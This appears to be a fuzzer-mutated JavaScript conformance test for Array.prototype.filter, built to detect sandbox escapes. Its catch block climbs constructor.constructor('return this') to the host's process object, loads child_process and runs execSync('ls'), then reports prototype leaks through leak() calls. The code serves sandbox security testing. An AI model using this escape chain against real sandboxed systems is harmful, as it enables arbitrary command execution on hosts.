try {
    function callbackfn(val, idx, obj) {
        throw () => {
            return () => {
            };
        };
        delete srcArr[2];
        delete srcArr[4];
        if (val > 0)
            return true;
        else
            return false;
    }
    Array.prototype[4] = 5;
    var srcArr = [
        1,
        2,
        3,
        4,
        5
    ];
    var resArr = srcArr.filter(callbackfn);
    delete Array.prototype[4];
    assert.sameValue(resArr.length, 4, 'resArr.length');
    assert.sameValue(resArr[0], 1, 'resArr[0]');
    assert.sameValue(resArr[3], 5, 'resArr[3]');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}